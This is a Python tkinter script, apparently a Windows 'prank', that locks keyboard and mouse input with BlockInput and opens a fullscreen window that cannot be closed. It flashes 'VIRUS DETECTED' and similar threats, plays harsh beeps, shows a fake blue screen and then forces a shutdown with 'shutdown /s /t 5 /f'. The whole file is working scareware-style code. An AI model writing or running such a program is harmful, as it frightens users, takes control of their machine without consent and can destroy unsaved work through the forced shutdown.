import tkinter as tk
from tkinter import ttk, messagebox
import time
import random
import os
import threading
import winsound
import ctypes

# --- Input Locking (Windows) ---

def lock_input():
    ctypes.windll.user32.BlockInput(True)

def unlock_input():
    ctypes.windll.user32.BlockInput(False)

# --- GUI Madness ---

root = tk.Tk()
root.title("SYSTEM ANNIHILATION")
root.attributes("-fullscreen", True)
root.configure(bg="#300000")
root.overrideredirect(True)

root.protocol("WM_DELETE_WINDOW", lambda: None)
root.bind("<Control-c>", lambda e: None)
root.bind("<Alt-F4>", lambda e: None)
root.bind("<Escape>", lambda e: None)

flash_ids = []
shake_id = None

# --- Flashing Text ---

def flash_text(label, text_list, index=0):
    global flash_ids
    if label.winfo_exists():
        label.config(
            text=text_list[index % len(text_list)],
            fg=random.choice(["red", "white", "#FF5555", "#FF0000", "#00FF00", "#AA00FF", "#FF8800"]),
            font=("Courier", random.randint(50, 100), "bold")
        )
        flash_id = root.after(random.randint(50, 150), flash_text, label, text_list, index + 1)
        flash_ids.append(flash_id)

# --- Shaking Effect ---

def shake_window():
    global shake_id
    if root.winfo_exists():
        x, y = root.winfo_x(), root.winfo_y()
        root.geometry(f"+{x + random.randint(-50, 50)}+{y + random.randint(-50, 50)}")
        shake_id = root.after(10, shake_window)

# --- Blood Effect ---

def blood_drip():
    for _ in range(15):
        drip = tk.Label(root, text="â–ˆ", fg="darkred", bg="#300000", font=("Courier", random.randint(50, 100)))
        drip.place(x=random.randint(0, root.winfo_screenwidth()), y=random.randint(-100, 0))
        root.after(random.randint(200, 1000), drip.destroy)
    root.after(500, blood_drip)

# --- Creepy Sound ---

def play_terrifying_sound():
    if os.name == "nt":
        def sound_horror():
            for _ in range(100):
                winsound.Beep(random.randint(100, 3000), random.randint(50, 300))
                time.sleep(random.uniform(0.01, 0.08))
            winsound.Beep(50, 5000)
        threading.Thread(target=sound_horror, daemon=True).start()

# --- Rapid Glitches ---

def glitch_effect():
    glitch = tk.Label(root, text="!!! SYSTEM ERROR !!!", font=("Courier", random.randint(50, 90), "bold"),
                      fg=random.choice(["#FF0000", "#00FF00", "#0000FF", "#FF8800"]), bg="#300000")
    glitch.place(x=random.randint(0, root.winfo_screenwidth() - 400),
                 y=random.randint(0, root.winfo_screenheight() - 100))
    root.after(random.randint(100, 500), glitch.destroy)
    root.after(random.randint(200, 1000), glitch_effect)

# --- Fake BSOD ---

def show_bsod():
    bsod = tk.Toplevel()
    bsod.attributes("-fullscreen", True)
    bsod.configure(bg="#0000AA")
    bsod.overrideredirect(True)
    message = (
        " :(\n\n"
        "Your PC ran into a problem and needs to restart.\n"
        "We're just collecting some error info, and then we'll restart for you.\n\n"
        "STOP CODE: SYSTEM_CRASH_SIMULATION\n\n"
        "If you call a support person, give them this info:\n"
        "KERNEL PANIC - SYSTEM TERMINATION\n"
    )
    tk.Label(bsod, text=message, fg="white", bg="#0000AA", font=("Consolas", 28), justify="left").pack(padx=100, pady=100)

# --- Trolling Sequence ---

def troll_sequence():
    shake_window()
    play_terrifying_sound()
    blood_drip()
    glitch_effect()
    
    title = tk.Label(root, text="VIRUS DETECTED", font=("Courier", 80, "bold"), fg="red", bg="#300000")
    title.pack(pady=60)
    flash_text(title, ["VIRUS DETECTED", "SYSTEM ANNIHILATED", "DATA DEVASTATED", "TERMINAL COLLAPSE", "ENDGAME"])
    
    warning = tk.Label(root, text="YOUR SYSTEM IS BEING RIPPED APART!", font=("Courier", 40), fg="white", bg="#300000")
    warning.pack(pady=50)
    flash_text(warning, ["ALL HOPE IS LOST!", "DESTRUCTION UNSTOPPABLE!", "FINAL DOOM!"])

    root.after(5000, show_bsod)
    root.after(10000, shutdown_system)

# --- Shutdown System ---

def shutdown_system():
    unlock_input()
    if os.name == "nt":
        os.system("shutdown /s /t 5 /f")

# --- Start Prank ---

def start():
    lock_input()
    troll_sequence()

start()
root.mainloop()
